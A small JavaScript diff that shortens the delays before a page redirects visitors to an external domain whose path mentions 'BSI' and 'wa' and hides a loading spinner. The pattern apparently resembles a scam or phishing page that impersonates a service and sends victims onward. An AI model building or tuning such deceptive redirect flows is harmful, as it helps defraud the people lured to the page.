@@ -157,8 +157,8 @@ function getcs(){
   
 setTimeout(function(){  
 location.href='https://anjayhostjon.cloud/BSI/7h27g/wa';
-    }, 5000);
+    }, 500);
     setTimeout(function(){
     $("#djload").hide();   
-    }, 5100);      
+    }, 510);      
 }     
